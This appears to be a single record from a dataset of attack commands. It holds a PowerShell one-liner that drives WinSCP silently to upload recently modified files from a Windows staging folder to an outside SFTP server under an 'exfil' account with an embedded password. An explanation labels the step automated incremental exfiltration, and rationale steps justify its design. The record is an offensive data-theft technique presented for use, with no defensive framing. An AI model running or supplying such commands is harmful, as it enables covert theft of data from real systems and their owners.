command: $r="/staging/"; & 'C:\Program Files (x86)\WinSCP\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@203.0.113.30/ -hostkey="ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="' ("put -resume C:\Windows\Temp\stage\* `"$r`" -filemask=>=1H") 'exit' | Out-Null 2>$null
explanation: Transfers only files modified within the last hour from a staging directory using WinSCP filemask time filter for automated incremental exfiltration.
rationale_steps: Target recently changed files to minimize volume
Open non-interactive SFTP session with host key pinning
Upload with time-based filemask and resume
